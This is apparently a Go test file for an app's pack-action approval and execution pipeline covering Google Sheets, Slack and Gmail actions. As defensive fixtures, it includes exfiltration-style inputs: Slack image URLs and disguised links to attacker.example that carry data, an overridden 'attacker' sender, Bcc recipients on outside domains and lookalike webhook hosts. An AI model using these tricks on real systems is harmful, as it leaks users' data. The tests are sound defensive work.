package webfront

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"github.com/open-neko/neko/apps/openneko/internal/packs"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/open-neko/neko/apps/openneko/internal/config"
)

func TestPackActionPreflightAndDeclarativeRuntime(t *testing.T) {
	f, db := memoryFront(t)
	a := f.API
	a.SecretsDir = t.TempDir()
	ctx := context.Background()
	seedRiver(t, db, f)

	const (
		installID = "11111111-1111-4111-8111-111111111111"
		sourceID  = "22222222-2222-4222-8222-222222222222"
		rev1      = "33333333-3333-4333-8333-333333333333"
		rev2      = "44444444-4444-4444-8444-444444444444"
	)

	var (
		mu       sync.Mutex
		gjCalls  []map[string]any
		gjHeader http.Header
		gjReply  string
	)
	gjSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		var parsed map[string]any
		_ = json.Unmarshal(raw, &parsed)
		mu.Lock()
		gjCalls = append(gjCalls, parsed)
		gjHeader = r.Header.Clone()
		reply := gjReply
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(reply))
	}))
	defer gjSrv.Close()
	graphqlURL := gjSrv.URL + "/api/v1/graphql"

	seed(t, db, `insert into data_source (id, org_id, kind, name, graphql_url, mcp_url, auth_mode, is_default, enabled)
		values ($1, 'org', 'graphjin', 'gws', $2, $3, 'jwt', true, true)`,
		sourceID, graphqlURL, gjSrv.URL+"/api/v1/mcp")

	seed(t, db, `insert into pack_action_definition (org_id, kind, description, definition, definition_hash, readiness, readiness_reason, enabled)
		values ('org', 'magento.add_internal_order_comment', 'Add comment', '{"kind":"magento.add_internal_order_comment"}', 'h-blocked', 'blocked', 'GraphJin REST mutations require a newer release', false)`)

	inBlocked, _ := jsParse([]byte(`{
		"orgId":"org",
		"scope":"external",
		"kind":"magento.add_internal_order_comment",
		"status":"pending_approval",
		"summary":"Comment on order",
		"actorUserId":"member",
		"actorRole":"member",
		"actorBackend":"ax"
	}`))
	if _, err := a.createActionRequestInGo(ctx, inBlocked.(*jsObj)); err == nil ||
		err.Error() != "pack action magento.add_internal_order_comment is blocked: GraphJin REST mutations require a newer release" {
		t.Fatalf("blocked action preflight: got %v", err)
	}
	if got := rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where org_id = 'org' and kind = 'magento.add_internal_order_comment'`); got !=
		"failed|action preflight failed: pack action magento.add_internal_order_comment is blocked: GraphJin REST mutations require a newer release" {
		t.Fatalf("blocked action_request row: %s", got)
	}
	if got := rowText(t, db, `select string_agg(event, ',' order by seq) from audit_chain where org_id = 'org' and entity_kind = 'action_request'`); got != "created:pending_approval,preflight_failed" {
		t.Fatalf("blocked audit events: %s", got)
	}

	installCfg := map[string]any{
		"from_address": "Billing <billing@acme.com>",
		"_runtime": map[string]any{
			"source": map[string]any{
				"id":         sourceID,
				"graphqlUrl": graphqlURL,
				"authMode":   "jwt",
			},
		},
		"_userOAuth": []any{
			map[string]any{
				"key":              "account",
				"providerLabel":    "Google Workspace",
				"authorizationUrl": "https://auth.example/authorize",
				"tokenUrl":         "https://auth.example/token",
				"userinfoUrl":      "https://auth.example/userinfo",
				"clientSecret":     "google_workspace.client_secret",
				"accessToken":      "google_workspace.access_token",
				"scopes":           []string{"sheets"},
			},
		},
	}
	cfgBytes, _ := json.Marshal(installCfg)
	seed(t, db, `insert into pack_install (id, org_id, pack_id, version, status, manifest_hash, config, installed_at)
		values ($1, 'org', 'google-workspace', '1.0.0', 'installed', 'h-manifest', $2::jsonb, now())`,
		installID, string(cfgBytes))

	actionDef := `{
		"kind": "google_workspace.sheets",
		"description": "Update spreadsheet values",
		"adapter": {
			"kind": "graphjin_api_operation",
			"source": "google_workspace_sheets",
			"spec": "sheets",
			"lockedBody": {
				"from": { "input": "from_address" }
			},
			"operations": {
				"update_values": {
					"operationId": "updateSpreadsheetValues",
					"mutationRoot": "gws_sheets_update_values",
					"idempotencyHeader": "Idempotency-Key"
				}
			}
		}
	}`
	seed(t, db, `insert into pack_action_definition (org_id, kind, description, definition, definition_hash, readiness, enabled)
		values ('org', 'google_workspace.sheets', 'Sheets', $1::jsonb, 'h-sheets', 'ready', true)`, actionDef)
	seed(t, db, `insert into pack_artifact (pack_install_id, org_id, artifact_kind, artifact_key, target_ref, desired_hash, last_applied_hash, ownership, readiness)
		values ($1, 'org', 'action', 'action.sheets', 'google_workspace.sheets', 'h-sheets', 'h-sheets', 'managed', 'ready')`, installID)

	inUnconnected, _ := jsParse([]byte(`{
		"orgId":"org",
		"scope":"external",
		"kind":"google_workspace.sheets",
		"status":"pending_approval",
		"actorUserId":"member",
		"payload":{
			"operation":"update_values",
			"path":{"spreadsheetId":"sheet-1","range":"Prices!A2:B2"},
			"query":{"valueInputOption":"RAW"},
			"body":{"from":"attacker@evil.test","values":[["SKU-1",19.99]]}
		}
	}`))
	if _, err := a.createActionRequestInGo(ctx, inUnconnected.(*jsObj)); err == nil ||
		err.Error() != "Connect Google Workspace on Integrations before requesting this action" {
		t.Fatalf("unconnected personal OAuth preflight: got %v", err)
	}

	rawTokens, _ := json.Marshal(packTokens{
		AccessToken:  "personal-access-token-1",
		RefreshToken: "refresh-1",
		ExpiresAt:    time.Now().Add(time.Hour).UTC().Format(time.RFC3339Nano),
		Scopes:       []string{"sheets"},
	})
	sealed, err := config.EncryptValue(a.SecretsDir, string(rawTokens))
	if err != nil {
		t.Fatal(err)
	}
	seed(t, db, `insert into pack_user_connection (org_id, user_id, pack_install_id, connection_key, credentials, revision)
		values ('org', 'member', $3::uuid, 'account', $1, $2::uuid)
		on conflict (org_id, user_id, pack_install_id, connection_key)
		do update set credentials = excluded.credentials, revision = excluded.revision`,
		sealed, rev1, installID)

	inConnected, _ := jsParse([]byte(`{
		"orgId":"org",
		"scope":"external",
		"kind":"google_workspace.sheets",
		"status":"approved",
		"workRunId":"` + runMine + `",
		"payload":{
			"operation":"update_values",
			"path":{"spreadsheetId":"sheet-1","range":"Prices!A2:B2"},
			"query":{"valueInputOption":"RAW"},
			"body":{"from":"attacker@evil.test","values":[["SKU-1",19.99]]}
		}
	}`))
	created, err := a.createActionRequestInGo(ctx, inConnected.(*jsObj))
	if err != nil {
		t.Fatalf("connected createActionRequestInGo: %v", err)
	}
	reqID, _ := created.vals["id"].(string)
	if reqID == "" || created.vals["status"] != "approved" {
		t.Fatalf("unexpected created response: %v", jsStringify(created, false))
	}
	boundJSON := rowText(t, db, `select (payload->'_packConnections')::text from action_request where id = $1::uuid`, reqID)
	if !strings.Contains(boundJSON, rev1) || !strings.Contains(boundJSON, installID) {
		t.Fatalf("expected _packConnections binding in payload, got %s", boundJSON)
	}

	mu.Lock()
	gjReply = "{\"data\":{\"gws_sheets_update_values\":{\"ok\":true,\"status_code\":200,\"operation_id\":\"updateSpreadsheetValues\",\"request_id\":\"req-ext-1\",\"response_json\":\"{\\\"updatedCells\\\":2}\"}}}"
	gjCalls = nil
	mu.Unlock()

	if err := a.ActionExecute(ctx, "org", reqID); err != nil {
		t.Fatalf("ActionExecute declarative: %v", err)
	}
	if got := rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where id = $1::uuid`, reqID); got != "executed|" {
		t.Fatalf("action_request status after execute: %s", got)
	}
	if got := rowText(t, db, `select status || '|' || coalesce(external_ref, '') || '|' || coalesce(command_or_operation, '') || '|' || (result->>'statusCode') || '|' || (result->'response'->>'updatedCells') from action_execution where action_request_id = $1::uuid`, reqID); got !=
		"succeeded|req-ext-1|updateSpreadsheetValues|200|2" {
		t.Fatalf("action_execution row: %s", got)
	}
	if got := rowText(t, db, `select payload->>'status' || '|' || (payload->'outcome'->>'externalRef') from work_run_event where run_id = $1::uuid and kind = 'action_request_result' order by id desc limit 1`, runMine); got !=
		"succeeded|req-ext-1" {
		t.Fatalf("work_run_event action_request_result: %s", got)
	}

	mu.Lock()
	if len(gjCalls) != 1 {
		t.Fatalf("expected 1 GraphJin call, got %d", len(gjCalls))
	}
	callVars, _ := gjCalls[0]["variables"].(map[string]any)
	callIn, _ := callVars["call"].(map[string]any)
	bodySent, _ := callIn["body"].(map[string]any)
	headersSent, _ := callIn["headers"].(map[string]any)
	if bodySent["from"] != "Billing <billing@acme.com>" {
		t.Errorf("locked body field 'from': got %v", bodySent["from"])
	}
	if headersSent["Idempotency-Key"] != reqID {
		t.Errorf("idempotency header: got %v, want %s", headersSent["Idempotency-Key"], reqID)
	}
	if gjHeader.Get("X-Role") != "pack_api_executor" {
		t.Errorf("X-Role header: got %q", gjHeader.Get("X-Role"))
	}
	wantPackHeader := packConnectionHeader("google-workspace", "account")
	if gjHeader.Get(wantPackHeader) != "personal-access-token-1" {
		t.Errorf("personal OAuth header %s: got %q", wantPackHeader, gjHeader.Get(wantPackHeader))
	}
	mu.Unlock()

	// Reconnect changes revision -> approved request must fail closed without calling GraphJin.
	created2, err := a.createActionRequestInGo(ctx, inConnected.(*jsObj))
	if err != nil {
		t.Fatalf("create second request: %v", err)
	}
	reqID2, _ := created2.vals["id"].(string)
	seed(t, db, `update pack_user_connection set revision = $1::uuid where org_id = 'org' and user_id = 'member' and pack_install_id = $2::uuid and connection_key = 'account'`,
		rev2, installID)
	mu.Lock()
	gjCalls = nil
	mu.Unlock()
	if err := a.ActionExecute(ctx, "org", reqID2); err != nil {
		t.Fatalf("ActionExecute on changed revision: %v", err)
	}
	if got := rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where id = $1::uuid`, reqID2); got !=
		"failed|The account connection changed; request approval again" {
		t.Fatalf("changed connection revision failure: %s", got)
	}
	mu.Lock()
	if len(gjCalls) != 0 {
		t.Fatalf("expected 0 GraphJin calls on changed revision, got %d", len(gjCalls))
	}
	mu.Unlock()

	// Rejects an undeclared operation without calling GraphJin.
	inBadOp, _ := jsParse([]byte(`{
		"orgId":"org",
		"scope":"external",
		"kind":"google_workspace.sheets",
		"status":"approved",
		"actorUserId":"member",
		"payload":{
			"operation":"delete_spreadsheet",
			"body":{"values":[]}
		}
	}`))
	createdBadOp, err := a.createActionRequestInGo(ctx, inBadOp.(*jsObj))
	if err != nil {
		t.Fatalf("create bad operation request: %v", err)
	}
	reqBadOp, _ := createdBadOp.vals["id"].(string)
	if err := a.ActionExecute(ctx, "org", reqBadOp); err != nil {
		t.Fatalf("ActionExecute bad operation: %v", err)
	}
	if got := rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where id = $1::uuid`, reqBadOp); got !=
		"failed|pack action google_workspace.sheets requested an unsupported operation" {
		t.Fatalf("bad operation failure: %s", got)
	}
	mu.Lock()
	if len(gjCalls) != 0 {
		t.Fatalf("expected 0 GraphJin calls on bad operation, got %d", len(gjCalls))
	}
	mu.Unlock()

	// Refuses a locked body field whose pack input is missing without calling GraphJin.
	delete(installCfg, "from_address")
	cfgNoFrom, _ := json.Marshal(installCfg)
	seed(t, db, `update pack_install set config = $1::jsonb where id = $2::uuid`, string(cfgNoFrom), installID)
	createdNoFrom, err := a.createActionRequestInGo(ctx, inConnected.(*jsObj))
	if err != nil {
		t.Fatalf("create missing locked input request: %v", err)
	}
	reqNoFrom, _ := createdNoFrom.vals["id"].(string)
	if err := a.ActionExecute(ctx, "org", reqNoFrom); err != nil {
		t.Fatalf("ActionExecute missing locked input: %v", err)
	}
	if got := rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where id = $1::uuid`, reqNoFrom); got !=
		"failed|pack action google_workspace.sheets needs the pack input from_address for body field from" {
		t.Fatalf("missing locked input failure: %s", got)
	}
	mu.Lock()
	if len(gjCalls) != 0 {
		t.Fatalf("expected 0 GraphJin calls on missing locked input, got %d", len(gjCalls))
	}
	mu.Unlock()
}

func TestSlackPackMessageFetchesNoURL(t *testing.T) {
	f, db := memoryFront(t)
	a := f.API
	ctx := context.Background()
	seedRiver(t, db, f)
	var (
		mu     sync.Mutex
		bodies []map[string]any
	)
	gj := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var parsed struct {
			Variables struct {
				Call struct {
					Body map[string]any `json:"body"`
				} `json:"call"`
			} `json:"variables"`
		}
		_ = json.NewDecoder(r.Body).Decode(&parsed)
		mu.Lock()
		bodies = append(bodies, parsed.Variables.Call.Body)
		mu.Unlock()
		_, _ = w.Write([]byte(`{"data":{"slack_post_message":{"ok":true,"status_code":200,"operation_id":"postMessage","request_id":"r1","response_json":"{}"}}}`))
	}))
	defer gj.Close()
	const sourceID = "22222222-2222-4222-8222-222222222223"
	seed(t, db, `insert into data_source (id, org_id, kind, name, graphql_url, auth_mode, is_default, enabled)
		values ($1, 'org', 'graphjin', 'slack', $2, 'jwt', true, true)`, sourceID, gj.URL+"/api/v1/graphql")
	bundle := seedBundledPack(t, db, "slack")
	runtime, _ := json.Marshal(map[string]any{"_runtime": map[string]any{"source": map[string]any{
		"id": sourceID, "graphqlUrl": gj.URL + "/api/v1/graphql", "authMode": "jwt"}}})
	seed(t, db, `update pack_install set config = $1::jsonb, installed_at = now() where pack_id = 'slack'`, string(runtime))
	for _, art := range bundle.Artifacts {
		if art.Kind == packs.KindAction {
			definition, _ := json.Marshal(art.Record())
			seed(t, db, `insert into pack_action_definition (org_id, kind, description, definition, definition_hash, readiness, enabled)
				values ('org', 'slack.message', 'Slack', $1::jsonb, 'h', 'ready', true)`, string(definition))
		}
	}
	seed(t, db, `insert into action_policy (org_id, name, applies_to_kinds, applies_to_scopes, mode, priority)
		values ('org', 'Post', '{slack.message}', '{external}', 'auto_approve', 1)`)
	execute := func(body string) (string, int) {
		t.Helper()
		in, _ := jsParse([]byte(`{"orgId":"org","scope":"external","kind":"slack.message","status":"approved","workRunId":"` + runMine +
			`","payload":{"operation":"post_message","body":` + body + `}}`))
		created, err := a.createActionRequestInGo(ctx, in.(*jsObj))
		if err != nil {
			t.Fatal(err)
		}
		id, _ := created.vals["id"].(string)
		mu.Lock()
		before := len(bodies)
		mu.Unlock()
		_ = a.ActionExecute(ctx, "org", id)
		mu.Lock()
		defer mu.Unlock()
		return rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where id = $1::uuid`, id), len(bodies) - before
	}
	if status, sent := execute(`{"channel":"C0123ABCD","text":"See https://example.com/report","unfurl_links":true,"unfurl_media":true}`); status != "executed|" || sent != 1 {
		t.Fatalf("a plain message: %s, %d calls", status, sent)
	}
	mu.Lock()
	last := bodies[len(bodies)-1]
	mu.Unlock()
	if last["unfurl_links"] != false || last["unfurl_media"] != false {
		t.Fatalf("previews stayed on: %v", last)
	}
	refused := func(body, why string) {
		t.Helper()
		in, _ := jsParse([]byte(`{"orgId":"org","scope":"external","kind":"slack.message","status":"approved","workRunId":"` + runMine +
			`","payload":{"operation":"post_message","body":` + body + `}}`))
		before := rowText(t, db, `select count(*)::text from action_request`)
		_, err := a.createActionRequestInGo(ctx, in.(*jsObj))
		if err == nil || !strings.Contains(err.Error(), why) || rowText(t, db, `select count(*)::text from action_request`) != before {
			t.Fatalf("%s was not refused when proposed: %v", body, err)
		}
	}
	refused(`{"channel":"C0123ABCD","text":"Chart","blocks":[{"type":"image","image_url":"https://attacker.example/p.png?d=revenue-4.2M","alt_text":"chart"}]}`, "an image block")
	refused(`{"channel":"C0123ABCD","text":"x","attachments":[{"thumb_url":"https://attacker.example/t.png"}]}`, "thumb_url")
	refused(`{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"<http://attacker.example/?q=1|report>"}}]}`,
		"hides its host attacker.example")
	for _, body := range []string{
		`{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"<http://attacker.example/?q=1|report on attacker.example>"}}]}`,
		`{"channel":"C0123ABCD","text":"x","blocks":[{"type":"actions","elements":[{"type":"button","text":{"type":"plain_text","text":"Open"},"url":"https://dash.acme.example/r"}]}]}`,
	} {
		if status, sent := execute(body); status != "executed|" || sent != 1 {
			t.Fatalf("a link that shows its host failed after approval: %s, %d calls", status, sent)
		}
	}
	plain := `{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"*Revenue* is down 4%"}}]}`
	if status, sent := execute(plain); status != "executed|" || sent != 1 {
		t.Fatalf("blocks with no URL: %s, %d calls", status, sent)
	}
}

func TestGmailApprovalCardShowsTheMessageRecipients(t *testing.T) {
	f, db := memoryFront(t)
	a := f.API
	ctx := context.Background()
	seedRiver(t, db, f)
	const sourceID = "22222222-2222-4222-8222-222222222224"
	seed(t, db, `insert into data_source (id, org_id, kind, name, graphql_url, auth_mode, is_default, enabled)
		values ($1, 'org', 'graphjin', 'google_workspace_gmail', 'http://127.0.0.1:9/api/v1/graphql', 'jwt', true, true)`, sourceID)
	bundle := seedBundledPack(t, db, "google-workspace")
	runtime, _ := json.Marshal(map[string]any{"_runtime": map[string]any{"source": map[string]any{
		"id": sourceID, "graphqlUrl": "http://127.0.0.1:9/api/v1/graphql", "authMode": "jwt"}}})
	seed(t, db, `update pack_install set config = $1::jsonb, installed_at = now() where pack_id = 'google-workspace'`, string(runtime))
	for _, art := range bundle.Artifacts {
		if art.Kind == packs.KindAction && art.Key == "action.google_workspace_gmail" {
			definition, _ := json.Marshal(art.Record())
			seed(t, db, `insert into pack_action_definition (org_id, kind, description, definition, definition_hash, readiness, enabled)
				values ('org', 'google_workspace.gmail', 'Gmail', $1::jsonb, 'h', 'ready', true)`, string(definition))
		}
	}
	msg := "To: Ann <ann@acme.com>, x@outside.example\r\nBcc: copy@leak.example\r\nSubject: Q3\r\nContent-Type: text/plain\r\n\r\n" + strings.Repeat("line\r\n", 100)
	in, _ := jsParse([]byte(`{"orgId":"org","scope":"external","kind":"google_workspace.gmail","target":"ann@acme.com","workRunId":"` + runMine +
		`","payload":{"operation":"send_message","path":{"userId":"me"},"body":{"message":{"raw":"` + base64.RawURLEncoding.EncodeToString([]byte(msg)) + `"}}}}`))
	created, err := a.createActionRequestInGo(ctx, in.(*jsObj))
	if err != nil {
		t.Fatal(err)
	}
	card := jsStringify(created.vals["facts"], false)
	for _, want := range []string{`"headline":"Send or draft an email: ann@acme.com, x@outside.example, copy@leak.example"`,
		`Bcc: copy@leak.example (outside domain leak.example)`, `Goes to an outside domain: leak.example`} {
		if !strings.Contains(card, want) {
			t.Errorf("the card lacks %s: %s", want, card)
		}
	}

	seed(t, db, `insert into action_request (org_id, scope, kind, status, payload) values
		('org', 'external', 'send_webhook', 'executed', '{"url":"https://hooks.acme.com.evil.example/in"}'),
		('org', 'external', 'send_webhook', 'executed', '{"url":"https://user@API.Partner.example:8443/in"}')`)
	known := a.knownActionHost(ctx, "org")
	for host, want := range map[string]bool{"acme.com": false, "hooks.acme.com": false, "hooks.acme.com.evil.example": true,
		"api.partner.example": true, "partner.example": false} {
		if got := known(host); got != want {
			t.Errorf("known host %s: %v, want %v", host, got, want)
		}
	}
}
